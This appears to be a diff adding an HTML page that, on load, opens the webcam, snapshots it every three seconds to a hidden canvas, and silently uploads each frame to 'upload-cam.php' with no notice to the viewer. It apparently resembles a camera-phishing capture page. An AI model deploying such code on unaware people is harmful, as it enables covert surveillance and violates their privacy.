@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="1000" height="1000" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    function startCapture() {
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        setInterval(() => takeAndUploadSnapshot(), 3000);
+      });
+    }
+
+    function takeAndUploadSnapshot() {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const timestamp = Date.now();
+        const filename = `imgCapture-${timestamp}.png`;
+        const dataUrl = canvas.toDataURL('image/png');
+
+        fetch('upload-cam.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+                image: dataUrl,
+                filename: filename
+            })
+        });
+
+    }
+
+    startCapture();
+  </script>
+</body>
+</html>
